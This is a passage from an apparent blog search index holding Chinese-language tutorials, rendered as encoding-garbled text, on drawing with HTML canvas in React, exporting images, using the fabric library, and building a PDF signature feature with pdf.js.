x 100ï¼Œä½†å› ç‚ºæˆ‘å€‘ç”¨ CSS è¨­å®šäº† width: 100pxï¼Œæ„æ€å°±æ˜¯æœ€å¾Œå‘ˆç¾çš„ç•«é¢å¿…é ˆå¾åŸæœ¬çš„ 50 x 100 è®Šæˆ 100 x 50ï¼Œä¹Ÿå°±æ˜¯ 2 å€ï¼ˆ100 / 50ï¼‰ï¼Œæ‰€ä»¥æœ€å¾Œçœ‹åˆ°çš„ç•«é¢æ‰æœƒçœ‹èµ·ä¾†æ”¾å¤§äº†å…©å€ã€‚ è€Œ canvas1 å› ç‚ºæ²’æœ‰è¨­å®š CSSï¼Œæ‰€ä»¥é è¨­æœƒè‡ªå‹•ä»¥ 1:1 çš„æ–¹å¼å»å‘ˆç¾ç•«å¸ƒä¸­çš„å…§å®¹ã€‚ åŸºæœ¬ç¹ªè£½åŠŸèƒ½é€™é‚Šåªè§£é‡‹å¤§æ¦‚æ€è·¯ï¼Œå¯¦ä½œçš„éƒ¨åˆ†å°±ç›´æ¥çœ‹ç¨‹å¼ç¢¼å§ï¼š å»ºç«‹ä¸€å€‹ flag ä¾†è¡¨ç¤ºç›®å‰æ˜¯å¦åœ¨ç¹ªåœ–ï¼Œè—‰æ­¤ä¾†é–‹é—œè·¯å¾‘çš„ç¹ªè£½ åœ¨ç•«å¸ƒä¸­ã€Œé»æ“Šã€æ™‚ï¼Œé–‹å•Ÿç¹ªåœ–ç‹€æ…‹ï¼ˆæ›´æ–° flagï¼‰ ã€Œç§»å‹•ã€æ¸¸æ¨™æ™‚ï¼Œå–å¾—åº§æ¨™ä½ç½®ä¸¦ç¹ªè£½è·¯å¾‘ï¼ˆåªæœ‰åœ¨ç¹ªåœ–ç‹€æ…‹æ™‚æ‰åŸ·è¡Œï¼‰ åœ¨å°æ‡‰çš„æ™‚æ©Ÿé»çµæŸç¹ªè£½ï¼Œä¸€å€‹æ˜¯æ¸¸æ¨™ã€Œé›¢é–‹ã€ç•«å¸ƒæ™‚ï¼Œä¸€å€‹æ˜¯ã€Œé¬†é–‹ã€æŒ‰éµæ™‚ åœ¨é›»è…¦ä¸Šå¿…é ˆç›£è½åº•ä¸‹äº‹ä»¶ï¼š onMouseDown onMouseMove onMouseUp onMouseLeave åœ¨æ‰‹æ©Ÿä¸Šå¿…é ˆç›£è½åº•ä¸‹äº‹ä»¶ï¼š onTouchStart onTouchMove onTouchCancel onTouchEnd 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980function App() { const canvas1 = useRef&lt;HTMLCanvasElement&gt;(null) // flag const isPanting = useRef&lt;boolean&gt;(false) useEffect(() =&gt; { const ctx1 = canvas1.current!.getContext('2d')! // ç·šæ¢çš„ config ctx1.lineWidth = 4 ctx1.lineCap = 'round' return () =&gt; { // è™•ç† React StrictMode æœƒæ¸²æŸ“å…©æ¬¡çš„å•é¡Œ ctx1.clearRect(0, 0, canvas.current!.width, canvas.current!.width) } }, []) // å–å¾—æ¸¸æ¨™åœ¨ç•«å¸ƒä¸­çš„ä½ç½®ï¼ˆåº§æ¨™ï¼‰ function getStartCoord(event: React.TouchEvent | React.MouseEvent) { const cavasSize = canvas1.current?.getBoundingClientRect()! const position = { x: 0, y: 0 } // pc / mobile if (event.type === 'mousemove') { position.x = (event as React.MouseEvent).clientX - cavasSize.left position.y = (event as React.MouseEvent).clientY - cavasSize.top } else { position.x = (event as React.TouchEvent).changedTouches[0].clientX - cavasSize.left position.y = (event as React.TouchEvent).changedTouches[0].clientY - cavasSize.top } return position } function onStart() { // é–‹å•Ÿç¹ªåœ–ç‹€æ…‹ isPanting.current = true } function onDrawing(event: React.TouchEvent | React.MouseEvent) { // å› ç‚ºç›£è½çš„æ˜¯ moveï¼Œæ‰€ä»¥è¦é¿å…åœ¨ canvas ç¯„çš„åœå¤–åŸ·è¡Œç¹ªè£½ if (isPanting.current) { const coord = getStartCoord(event) const ctx1 = canvas1.current!.getContext('2d')! ctx1.lineTo(coord.x, coord.y) ctx1.stroke() } } // çµæŸç¹ªåœ– function onFinish() { const ctx1 = canvas1.current!.getContext('2d')! // è¨˜å¾—é‡æ–°é–‹å•Ÿä¸€å€‹æ–°çš„ç¹ªåœ–è·¯å¾‘ï¼Œä¸ç„¶æœƒå½±éŸ¿åˆ°ä¸‹ä¸€æ¬¡çš„ç¹ªåœ–ï¼ˆé‡è¦!!!ï¼‰ ctx1.beginPath() // æ›´æ–° flag isPanting.current = false } return ( &lt;div className='App'&gt; &lt;canvas ref={canvas1} id='canvas' width='500' height='300' onMouseMove={onDrawing} onMouseDown={onStart} onMouseUp={onFinish} onMouseLeave={onFinish} onTouchStart={onStart} onTouchMove={onDrawing} onTouchCancel={onFinish} onTouchEnd={onFinish} &gt;&lt;/canvas&gt; &lt;/div&gt; )} é™„è¨»ï¼šCodepen ç”¢ç”Ÿåœ–ç‰‡Canvas å…ƒç´ ä¸Šæœ‰ä¸€å€‹ toDataURL çš„ methodï¼Œå¯ä»¥ç”¨ä¾†æŠŠç›®å‰ç•«å¸ƒä¸Šçš„å…§å®¹è½‰æ›æˆã€Œbase64ã€çš„æ ¼å¼ã€‚å¦‚æœä½ å° base64 ä¸é™Œç”Ÿçš„è©±ï¼Œæ‡‰è©²å°±æœƒçŸ¥é“å®ƒå…¶å¯¦å¯ä»¥ç•¶ä½œ &lt;img&gt; çš„ src å€¼ï¼Œé€™æ¨£å°±å¯ä»¥é¡¯ç¤ºåœ–ç‰‡äº†ï¼ ç›´æ¥ä¾†çœ‹ç¯„ä¾‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950function App() { const canvas = useRef&lt;HTMLCanvasElement&gt;(null) const [imgSrc, setImgSrc] = useState&lt;string&gt;('') const isPanting = useRef&lt;boolean&gt;(false) // flag // ...ç•¥ï¼Œé€™é‚Šéƒ½è·Ÿä¹‹å‰çš„ç¯„ä¾‹ä¸€æ¨£ // æ¸…é™¤ç•«å¸ƒ function onClear() { const ctx = canvas.current!.getContext('2d')! ctx.clearRect(0, 0, canvas.current!.width, canvas.current!.width) setImgSrc('') } // è¼¸å‡ºåœ–ç‰‡ function onSave() { // æŠŠç›®å‰ç•«å¸ƒä¸Šçš„å…§å®¹è½‰æˆ base64 æ ¼å¼ const base64 = canvas.current!.toDataURL('image/png') setImgSrc(base64) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;canvas ref={canvas} id='canvas' width='500' height='300' onMouseMove={onDrawing} onMouseDown={onStart} onMouseUp={onFinish} onMouseLeave={onFinish} onTouchStart={onStart} onTouchMove={onDrawing} onTouchCancel={onFinish} onTouchEnd={onFinish} &gt;&lt;/canvas&gt; &lt;div className='img-wrapper'&gt; {/* æœ‰ src æ™‚æ‰é¡¯ç¤ºåœ–ç‰‡ */} {imgSrc !== '' ? &lt;img src={imgSrc} /&gt; : &lt;p&gt;No imgae yet...&lt;/p&gt;} &lt;/div&gt; &lt;/div&gt; &lt;div className='btns'&gt; &lt;button onClick={onClear}&gt;Reset&lt;/button&gt; &lt;button onClick={onSave}&gt;Save&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; )} é™„è¨»ï¼šCodepen","link":"/2022/11/18/canvas-basic-draw-and-export-image/"},{"title":"Canvasï¼åˆ©ç”¨ fabric æ‰“é€ æ›´å¥½çš„ Canvas","text":"è®“ä½ çš„ canvas æ›´éˆæ´»ã€‚ ä»€éº¼æ˜¯ fabricï¼Ÿfabric æ˜¯ä¸€å€‹ Canvas çš„å¥—ä»¶ï¼Œä»–å¯ä»¥è®“ Canvas ä¸­çš„å…§å®¹è®Šå¾—æ›´å…·æœ‰äº’å‹•æ€§ï¼Œåƒé€™æ¨£ï¼š é™„è¨»ï¼šCodePen é€™æ®µåŠŸèƒ½åªéœ€è¦é€™æ¨£çš„åŸå§‹ç¢¼å°±å¯ä»¥å¯¦ç¾ï¼š 12345678910111213141516171819202122232425function App() { const canvasEl = useRef&lt;HTMLCanvasElement&gt;(null) useEffect(() =&gt; { // ç”¨ fabric new ä¸€å€‹ Canvas å‡ºä¾† const canvas = new fabric.Canvas(canvasEl.current) // å»ºç«‹æ–‡å­—å…ƒç´  const text = new fabric.Text('Hello PeaNu') // å»ºç«‹åœˆåœˆå…ƒç´  const circle = new fabric.Circle({ fill: 'dodgerblue', radius: 100 }) // æ”¾å…¥ Canvas ä¸­ canvas.add(text, circle) }, []) return ( &lt;div className='App'&gt; &lt;canvas ref={canvasEl} width='500' height='300' style={{ border: '1px solid black' }} &gt;&lt;/canvas&gt; &lt;/div&gt; )} é—œæ–¼èƒŒå¾Œçš„åŸç†å…¶å¯¦ fabric çš„åŸç†ç°¡å–®ä¾†èªªå°±æ˜¯ç”¨ä¸€å€‹ã€Œæ–°çš„ canvas ä¾†åŒ…ä½åŸæœ¬çš„ canvasã€ï¼Œæœ‰é»åƒæ˜¯ä»£ç†çš„æ„Ÿè¦ºã€‚ç•¶ä½ æƒ³å° canvas åšä»»ä½•æ“ä½œæ™‚ï¼Œéƒ½æ˜¯å…ˆè·Ÿ fabric èªªï¼Œfabric åœ¨å¹«ä½ åšå°æ‡‰çš„è™•ç†ã€‚ æ‰€ä»¥åœ¨ç”¨ fabric çš„æ™‚å€™é€šå¸¸éƒ½æ˜¯æˆ‘å€‘çµ¦ä»–ä¸€äº›è³‡è¨Šï¼ˆä¾‹å¦‚ï¼šç‰©ä»¶ï¼‰ï¼Œæ¥è‘— fabric å°±æœƒåˆ©ç”¨é€™äº›è³‡è¨Šä¾†å° canvas åšè™•ç†ã€‚ å¦‚æœæƒ³ç­è§£æ›´å¤šçš„è©±å»ºè­°é–±è®€å®˜ç¶²ä¸Šçš„ Tutorialï¼Œè£¡é¢èƒ½å­¸åˆ°å¤§éƒ¨åˆ†çš„åŸºç¤æ¦‚å¿µã€‚ äº‹ä»¶fabric æœ‰æä¾›å°æ‡‰çš„äº‹ä»¶å¯ä»¥ç›£è½ï¼Œåƒæ˜¯å¸¸è¦‹çš„é»æ“Šï¼Œé¸å–éƒ½å¯ä»¥é€éç‰¹å®šçš„ã€Œåç¨±ã€ä¾†ç¶å®šï¼Œé€™é‚Šä»‹ç´¹å¹¾å€‹æ¯”è¼ƒå¸¸ç”¨åˆ°çš„ï¼š mouse:down é»æ“Šç•¶ä¸‹è§¸ç™¼ï¼ˆå¯æƒ³æˆ clickï¼‰ mouse:move ç•¶ hover çš„æ™‚å€™è§¸ç™¼ mouse:up é»æ“Šä»¥å¾Œè§¸ç™¼ï¼ˆé¬†é–‹æ»‘é¼ éµï¼‰ after:render æ¸²æŸ“å®Œç•¢å¾Œè§¸ç™¼ before:selection:cleared å–æ¶ˆé¸å–ä¹‹å‰è§¸ç™¼ selection:cleared å–æ¶ˆé¸å–ä¹‹å¾Œè§¸ç™¼ selection:created é¸å–å¾Œè§¸ç™¼ï¼ˆå–®å€‹æˆ–å¤šå€‹éƒ½é©ç”¨ï¼‰ object:moving ç•¶ç§»å‹•ç‰©ä»¶æ™‚è§¸ç™¼ï¼ˆé€£çºŒï¼‰ object:selected ç‰©ä»¶è¢«é¸å–æ™‚è§¸ç™¼ï¼ˆå·²æ£„ç”¨ï¼‰ é™„è¨»ï¼šå¾Œä¾†ç™¼ç¾é€™äº›äº‹ä»¶åç¨±å¦‚æœæ˜¯çµ¦ã€Œç‰©ä»¶ã€ç”¨çš„è©±ï¼Œåç¨±æœƒæœ‰ä¸€é»ä¸åŒï¼Œåƒ mouse:down æœƒè®Šæˆ mousedownï¼Œæ‰€ä»¥å¦‚æœé‡åˆ°æ²’åæ‡‰çš„å•é¡Œï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯ä½ äº‹ä»¶åç¨±å¯«éŒ¯çš„é—œä¿‚ QQ é™„è¨»ï¼šåªè¦æœ‰ object é€™å€‹å‰ç¶´åŸºæœ¬ä¸Šå°±æ˜¯é‡å° canvas ä¸­çš„ã€Œç‰©ä»¶ã€ä¾†åšç›£è½ã€‚ ä¾†ä¸€å€‹ç°¡å–®çš„ç¯„ä¾‹ï¼š 123456789101112131415161718192021222324function App() { const canvasEl = useRef&lt;HTMLCanvasElement&gt;(null) useEffect(() =&gt; { const canvas = new fabric.Canvas(canvasEl.current) const circle = new fabric.Circle({ fill: 'dodgerblue', radius: 100 }) canvas.add(circle) canvas.on('mouse:down', (option) =&gt; { console.log('event', option.e) console.log('target', option.target) }) }, []) return ( &lt;div className='App'&gt; &lt;canvas ref={canvasEl} width='500' height='300' style={{ border: '1px solid black' }} &gt;&lt;/canvas&gt; &lt;/div&gt; )} é™„è¨»ï¼šCodePen ç•¶ callback è§¸ç™¼æ™‚æœƒæ¥æ”¶ä¸€å€‹ option ç‰©ä»¶ï¼Œä¸»è¦çš„å…§å®¹æ˜¯ï¼š option.e åŸç”Ÿçš„ JS event ç‰©ä»¶ option.target è§¸ç™¼è©²äº‹ä»¶çš„é‚£å€‹ä¸»è¦ç‰©ä»¶ï¼ˆé€šå¸¸å«åš Klassï¼‰ å¦å¤–åƒ object:moving é€™ç¨®äº‹ä»¶ä¹Ÿå¯ä»¥ç¶å®šåœ¨ã€Œç‰©ä»¶ã€ä¸Šï¼Œä¸ä¸€å®šè¦ç›´æ¥ç¶åœ¨ canvas å¯¦ä¾‹ä¸Šï¼Œåƒé€™æ¨£ï¼š 12345678910111213141516171819202122232425function App() { const canvasEl = useRef&lt;HTMLCanvasElement&gt;(null) useEffect(() =&gt; { const canvas = new fabric.Canvas(canvasEl.current) const circle = new fabric.Circle({ fill: 'dodgerblue', radius: 100 }) canvas.add(circle) // æ³¨æ„é€™æ™‚å€™æ˜¯ç”¨ movingï¼Œè€Œä¸æ˜¯ object:moving circle.on('moving', (option) =&gt; { console.log('event', option.e) console.log('target', option.target) }) }, []) return ( &lt;div className='App'&gt; &lt;canvas ref={canvasEl} width='500' height='300' style={{ border: '1px solid black' }} &gt;&lt;/canvas&gt; &lt;/div&gt; )} é™„è¨»ï¼šCodePen ç¶œåˆç¯„ä¾‹åœ¨çŸ¥é“å¤§æ¦‚æœ‰å“ªäº›äº‹ä»¶å¯ä»¥ç”¨ä¹‹å¾Œï¼Œå°±å¯ä»¥åšå‡ºç°¡å–®çš„æ¸…é™¤åŠŸèƒ½ï¼š é€™é‚Šçš„æ€è·¯é‚„ç›´è¦ºçš„ï¼Œå°±æ˜¯ï¼š ç•¶é¸å–ç‰©ä»¶æ™‚ï¼Œæ›´æ–° state è®“ clear æŒ‰éˆ•å¯ä»¥é»é¸ è‹¥å–æ¶ˆé¸å–ï¼Œå‰‡æ›´æ–° state ç¦ç”¨ clear æŒ‰éˆ• æœ€å¾ŒæŒ‰ä¸‹ clear æŒ‰éˆ•æ™‚ï¼Œé€é getActiveObject ä¾†å–å¾—ç›®å‰è¢«é¸å–çš„ç‰©ä»¶ä¸¦ç”¨ remove ä¾†ç§»é™¤ æœ‰èˆˆè¶£å¯ä»¥åˆ° Codepen ä¸Šåƒè€ƒã€‚ æ€éº¼å° Group èµ·ä¾†å¾Œçš„å­å…ƒç´ äº‹ä»¶ç›£è½ï¼Ÿæˆ‘ç•¶åˆè©¦éé€™å¹¾ç¨®æ–¹æ³•ï¼Œä½†éƒ½æ²’æ•ˆï¼š ç›´æ¥å°å­å…ƒç´ è¨­ç½®ç›£è½å™¨ï¼ˆäº‹ä»¶æœƒæ²’æ•ˆï¼‰ æƒ³é€é option.e.target ä¾†å–å¾—è§¸ç™¼çš„å­å…ƒç´ ï¼ˆåªæœƒå–åˆ° groupï¼‰ å¾Œä¾†åƒè€ƒäº†é€™ç¯‡æ‰è§£æ±ºï¼Œç°¡å–®ä¾†èªªå°±æ˜¯è¦åœ¨å»ºç«‹ group çš„æ™‚å€™æŠŠ subTargetCheck è¨­ç‚º trueï¼Œæ¥è‘—äº‹ä»¶ç™¼ç”Ÿæ™‚å°±å¯ä»¥é€é option.subTargets[0] ä¾†å­˜å–è©²çœŸæ­£çš„é‚£å€‹ç›®æ¨™ã€‚ æ›´å¥½ç”¨çš„ç¹ªåœ–åŠŸèƒ½é›–ç„¶åœ¨ä¹‹å‰æœ‰å¯¦ä½œéå¦‚ä½•ç”¨åŸç”Ÿçš„ canvas ä¾†å¯¦ç¾ç¹ªè£½åŠŸèƒ½ï¼Œä½†ç”¨ fabric å¯ä»¥æ›´è¼•é¬†ä¸”ç•«å‡ºæ›´æ»‘é †çš„ç·šæ¢ï¼Œç›´æ¥ä¾†çœ‹ç¯„ä¾‹å§ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556function App() { const canvasEl = useRef&lt;HTMLCanvasElement&gt;(null) useEffect(() =&gt; { // ç”¨ fabric new ä¸€å€‹ Canvas å‡ºä¾†ï¼Œä¸¦å­˜åˆ° ref canvasEl.current = new fabric.Canvas('orig-canvas') // å»ºç«‹ç­†åˆ· const brush = new fabric.PencilBrush(canvasEl.current) // ç­†åˆ·è¨­å®š canvasEl.current.freeDrawingBrush = brush canvasEl.current.freeDrawingBrush.width = 5 // é–‹å•Ÿç¹ªåœ–æ¨¡å¼ï¼ˆé‡è¦!!!ï¼‰ canvasEl.current.isDrawingMode = true return () =&gt; { // å› ç‚º Strick Modeï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡è¦å…ˆæ¸…æ‰ const data = canvasEl.current.dispose() } }, []) function swicher(type: 'brush' | 'erase') { switch (type) { case 'brush': // æ–°å¢ç­†åˆ· -&gt; è¨­å®š -&gt; é–‹å•Ÿç¹ªåœ–æ¨¡å¼ const brush = new fabric.PencilBrush(canvasEl.current) canvasEl.current.freeDrawingBrush = brush canvasEl.current.freeDrawingBrush.width = 5 canvasEl.current.isDrawingMode = true break case 'erase': // æ–°å¢æ©¡çš®æ“¦ -&gt; è¨­å®š -&gt; é–‹å•Ÿç¹ªåœ–æ¨¡å¼ const erase = new fabric.EraserBrush(canvasEl.current) canvasEl.current.freeDrawingBrush = erase canvasEl.current.freeDrawingBrush.width = 10 canvasEl.current.isDrawingMode = true break default: break } } return ( &lt;div className='App'&gt; &lt;div className='options'&gt; &lt;button onClick={() =&gt; swicher('brush')}&gt;Brush&lt;/button&gt; &lt;button onClick={() =&gt; swicher('erase')}&gt;Erase&lt;/button&gt; &lt;/div&gt; &lt;canvas id='orig-canvas' width='500' height='300' style={{ border: '1px solid black' }} &gt;&lt;/canvas&gt; &lt;/div&gt; )} é™„è¨»ï¼šæ©¡çš®æ“¦åŠŸèƒ½ä¸¦æ²’æœ‰å…§å»ºåœ¨ fabric ä¸­ï¼Œå¿…éœ€å¼•å…¥é¡å¤–çš„æ¨¡çµ„æ‰è¡Œï¼Œè©³ç´°å¯åƒè€ƒå®˜æ–¹èªªæ˜ã€‚ é€™æ¨£å°±æœ‰ä¸€å€‹ç•«ç•«è·Ÿæ©¡çš®æ“¦çš„åŠŸèƒ½å›‰ï¼è€Œä¸”ç”¨èµ·ä¾†æ›´æ»‘é †ï¼Œå¯ä»¥å»åº•ä¸‹ç¯„ä¾‹å»å¯¦éš›ç©ç©çœ‹å°±èƒ½æ„Ÿå—åˆ°å·®ç•°äº†ï¼š åŸç”Ÿç¯„ä¾‹ fabric ç¯„ä¾‹ å¯¦ä½œ PDF ç°½ååŠŸèƒ½é€™é‚Šåªè§£é‡‹æ€è·¯ï¼Œå‰©ä¸‹çš„å°±éº»ç…©å„ä½çœ‹ code å’Œè¨»è§£äº†ã€‚ æŠŠ PDF é¡¯ç¤ºåˆ° canvas ä¸Šçš„æµç¨‹ï¼š ä½¿ç”¨è€…é»æ“Šã€Œä¸Šå‚³æª”æ¡ˆã€æ™‚ï¼Œè®€å–æª”æ¡ˆå…§å®¹ä¸¦è½‰æ›æˆ base64 æ ¼å¼ ç”¢ç”Ÿä¸€å€‹ canvas å…ƒç´ ï¼Œä¸¦æŠŠè½‰æˆ base64 æ ¼å¼çš„æª”æ¡ˆä¸Ÿçµ¦ Pdfjs è™•ç†å¾Œå¡é€²å»è£¡é¢ åˆ©ç”¨ fabric æŠŠ canvas å…ƒç´ ï¼ˆé‚£å€‹ PDFï¼‰è½‰æˆ img å¾Œä¸Ÿæ¸²æŸ“åˆ°çœŸæ­£è¦é¡¯ç¤ºåœ¨ç•«é¢ä¸Šçš„ canvas ç°½åçš„æµç¨‹ï¼š ä½¿ç”¨è€…é»æ“Šã€ŒSignatureã€ï¼Œå½ˆå‡º Modal å¾ŒæŠŠè£¡é¢çš„ canvas é–‹å•Ÿç¹ªåœ–åŠŸèƒ½ ä½¿ç”¨è€…ç°½å¥½åå¾ŒæŒ‰ä¸‹ã€ŒSaveã€ï¼ŒæŠŠç°½åçš„éƒ¨åˆ†åˆ©ç”¨ fabric è½‰æ›åœ–ç‰‡ï¼Œæ¥è‘—åœ¨æ’å…¥åˆ°ç•«é¢ä¸Šé‚£å€‹ canvas ä¸­ï¼ˆé¡¯ç¤º PDF å…§å®¹çš„é‚£å€‹ï¼‰ é€™é‚Šæœƒæ¯”è¼ƒäº‚çš„åœ°æ–¹å°±æ˜¯æœ‰å„ç¨® canvas å’Œè³‡æ–™è½‰æ›çš„æµç¨‹ï¼Œæ‰€ä»¥å¯èƒ½é‚„æ˜¯è¦æ­é…åŸå§‹ç¢¼ä¾†è®€æœƒæ¯”è¼ƒå¥½ç†è§£ä¸€é»ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142function App() { const { isOpen, onOpen, onClose } = useDisclosure() // é¡¯ç¤º pdf å’Œç°½åå€å¡Šçš„ canvas const canvasPdf = useRef&lt;any&gt;(null) // é¡¯ç¤ºç°½åå€å¡Šçš„ canvas const canvasSignature = useRef&lt;any&gt;(null) useEffect(() =&gt; { canvasPdf.current = new fabric.Canvas('canvas-pdf') return () =&gt; { canvasPdf.current.dispose() } }, []) function readBlob(blob: Blob): Promise&lt;string&gt; { return new Promise((resolve, reject) =&gt; { const fileReader = new FileReader() fileReader.addEventListener('load', () =&gt; resolve(fileReader.result as string)) fileReader.addEventListener('error', () =&gt; reject('read blob failed')) fileReader.readAsDataURL(blob) }) } async function getPdfCanvas(file: File) { // æŠŠ blob è½‰æˆ base64 æ ¼å¼ const base64 = await readBlob(file) // è¨˜å¾—è¦å»æ‰æª”æ¡ˆ type çš„å‰ç¶´ï¼Œä¸ç„¶æ²’æœ‰è¾¦æ³•è™•ç† const data = atob(base64.substring(base64Prefix.length)) // æ³¨æ„æ˜¯ä»¥ Object ä¾†å‚³å…¥ const pdfDoc = await getDocument({ data }).promise const pdfPage = await pdfDoc.getPage(1) const viewport = pdfPage.getViewport({ scale: window.devicePixelRatio }) // å»ºç«‹ canvas å…ƒç´  const canvasElement = document.createElement('canvas') const context = canvasElement.getContext('2d')! // è¨­å®š canvas çš„å¯¬é«˜ canvasElement.height = viewport.height canvasElement.width = viewport.width // æŠŠ pdf æ¸²æŸ“åˆ° canvas ä¸­ await pdfPage.render({ canvasContext: context, viewport }).promise // æŠŠåšå¥½çš„ canvas å›å‚³ return canvasElement } async function onFileSelect(event: React.ChangeEvent&lt;HTMLInputElement&gt;) { const file = event.target.files![0] // æ²’æœ‰é¸æ“‡æª”æ¡ˆå°±è·³å‡º if (!file) return // æŠŠ pdf è®Šæˆ canvas å…ƒç´  await getPdfCanvas(file).then((element) =&gt; { const scale = 1 / window.devicePixelRatio // åˆ©ç”¨ canvas(pdf) ä¾†ç”¢ç”Ÿ fabric image å…ƒç´  const img = new fabric.Image(element, { scaleX: scale, scaleY: scale }) // ç”¨ä¾†æ›´æ–° canvas çš„ç•«é¢ï¼ˆé‡æ–°æ¸²æŸ“ï¼‰ canvasPdf.current.requestRenderAll() canvasPdf.current.setWidth(img.width! / window.devicePixelRatio) canvasPdf.current.setHeight(img.height! / window.devicePixelRatio) // æŠŠ pdf åœ–ç‰‡è¨­ç‚º canvas çš„èƒŒæ™¯ canvasPdf.current.setBackgroundImage(img, canvasPdf.current.renderAll.bind(canvasPdf.current)) }) } // é—œé–‰ modalï¼Œä¸¦æŠŠç°½åè½‰æˆåœ–ç‰‡æ”¾å…¥é¡¯ç¤º PDF çš„ canvas ä¸­ function onSave() { const imgSrc = canvasSignature.current.toDataURL({ format: 'png' }) fabric.Image.fromURL(imgSrc, (img) =&gt; { img.left = 200 img.top = 200 img.scaleX = 0.5 img.scaleY = 0.5 canvasPdf.current.add(img) }) onClose() } // æŠŠç•«é¢ä¸Šå·²é¸å–çš„å…ƒç´ åˆªé™¤ function onClear() { canvasPdf.current.remove(canvasPdf.current.getActiveObject()) } // æ‰“é–‹ç”¨ä¾†ç°½åçš„ modal function onModal() { onOpen() // modal å‰›æ‰“é–‹æ™‚é‚„æŠ“ä¸åˆ°å…ƒç´ ï¼Œæ‰€ä»¥æ‰åˆ©ç”¨ setTimeout è™•ç†ï¼ˆæˆ‘ç›¸ä¿¡ä¸€å®šæœ‰æ¯”é€™æ›´å¥½çš„å¯«æ³•ï¼Œä½†æˆ‘ç›®å‰æ²’æƒ³åˆ°ï¼‰ setTimeout(() =&gt; { // æŠŠ modal ä¸­çš„ canvas åŠ å…¥ç¹ªåœ–åŠŸèƒ½ canvasSignature.current = new fabric.Canvas('canvas-signature') const brush = new fabric.PencilBrush(canvasSignature.current) canvasSignature.current.freeDrawingBrush = brush canvasSignature.current.freeDrawingBrush.width = 3 canvasSignature.current.isDrawingMode = true }, 0) } return ( &lt;div className='App'&gt; &lt;input type='file' onChange={onFileSelect} /&gt; &lt;div className='canvas-pdf-wrapper'&gt; &lt;canvas id='canvas-pdf' width='500' height='300' style={{ border: '1px solid black' }} &gt;&lt;/canvas&gt; &lt;/div&gt; &lt;div className='options'&gt; &lt;Button colorScheme='pink' onClick={onClear}&gt; Clear &lt;/Button&gt; &lt;Button colorScheme='teal' onClick={onModal}&gt; Signature &lt;/Button&gt; &lt;/div&gt; &lt;Modal isOpen={isOpen} onClose={onClose} useInert={false}&gt; &lt;ModalOverlay /&gt; &lt;ModalContent&gt; &lt;ModalHeader&gt;Signature&lt;/ModalHeader&gt; &lt;ModalCloseButton /&gt; &lt;ModalBody&gt; &lt;canvas id='canvas-signature'&gt;&lt;/canvas&gt; &lt;/ModalBody&gt; &lt;ModalFooter&gt; &lt;Button colorScheme='pink' onClick={onClose}&gt; Close &lt;/Button&gt; &lt;Button colorScheme='teal' onClick={onSave}&gt; Save &lt;/Button&gt; &lt;/ModalFooter&gt; &lt;/ModalContent&gt; &lt;/Modal&gt; &lt;/div&gt; )} é™„è¨»ï¼šcodesandboxï¼Œé †é“ä¸€æé€™é‚Šå› ç‚ºæ‡¶å¾—æ‰‹åˆ»æ‰€ä»¥å¥—äº†ä¸€ä¸‹ chakraã€‚ åŠ ä¸Šåˆªé™¤æŒ‰éˆ•å¦‚æœä½ æƒ³è¦è®“æ¯ä¸€å€‹ç‰©ä»¶å¯ä»¥æœ‰é» X ä¾†æ¸…é™¤çš„é€™ç¨®åŠŸèƒ½ï¼Œå¯ä»¥åƒè€ƒé€™ç¯‡ å®˜æ–¹æ–‡ä»¶ã€‚","link":"/2022/11/29/canvas-fabric/"},{"title":"Canvasï¼æ¸²æŸ“ PDF çš„æ–¹æ³•","text":"è¬›ç™½è©±ä¸€é»å°±æ˜¯æŠŠ PDF è®Šæˆ Cavasã€‚ ç’°å¢ƒé…ç½®ç”±æ–¼æˆ‘ç•¶åˆåœ¨ç ”ç©¶æ™‚è¸©åˆ°äº†ä¸€äº›åœ°é›·ï¼Œæ‰€ä»¥é‚„æ˜¯èªªæ˜ä¸€ä¸‹ç’°å¢ƒé…ç½®çš„æ–¹å¼ã€‚é€™é‚Šè¦å®‰è£çš„å¥—ä»¶æ˜¯ pdf.jsã€‚ä¸éå› ç‚ºæ˜¯ç”¨ React ä¾†å¯¦ä½œï¼Œæ‰€ä»¥æœƒç”¨ npm ä¾†å®‰è£ pdfjs-dist é€™å€‹å¥—ä»¶ã€‚ è£å¥½å¥—ä»¶å¾Œï¼Œå¿…é ˆå†é€é GlobalWorkerOptions ä¾†åšé…ç½®ï¼š 12345import { GlobalWorkerOptions } from 'pdfjs-dist'import pdf from './assets/sample.pdf'const src = 'https://cdn.jsdelivr.net/npm/pdfjs-dist@&lt;your_pack_version&gt;/build/pdf.worker.js'GlobalWorkerOptions.workerSrc = src è«‹å‹™å¿…æŠŠ &lt;your_pack_version&gt; å¡«å…¥å’Œ pdfjs-dist ç›¸åŒçš„ç‰ˆè™Ÿ è«‹å‹™å¿…æŠŠ &lt;your_pack_version&gt; å¡«å…¥å’Œ pdfjs-dist ç›¸åŒçš„ç‰ˆè™Ÿ è«‹å‹™å¿…æŠŠ &lt;your_pack_version&gt; å¡«å…¥å’Œ pdfjs-dist ç›¸åŒçš„ç‰ˆè™Ÿ å¦‚æœæ²’æœ‰åšé€™æ®µé…ç½®æˆ–æ˜¯ä½ å¡«éŒ¯ç‰ˆè™Ÿï¼Œç­‰ä¸€ä¸‹åœ¨ä½¿ç”¨çš„æ™‚å€™å°±æœƒå‡ºéŒ¯ï¼Œæ‰€ä»¥è«‹å‹™å¿…å…ˆåšå¥½é€™æ®µé…ç½®ã€‚ è®€å–æœ¬æ©Ÿæª”æ¡ˆé€™æ®µä¸»è¦æ˜¯ä»‹ç´¹æ€éº¼ç”¨å¥—ä»¶æä¾›çš„ methods ä¾†è®€å–å’Œæ¸²æŸ“ï¼Œè¦ç‰¹åˆ¥æ³¨æ„çš„æ˜¯é€™æ®µæœŸé–“æ˜¯ã€ŒéåŒæ­¥ã€åŸ·è¡Œçš„ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// 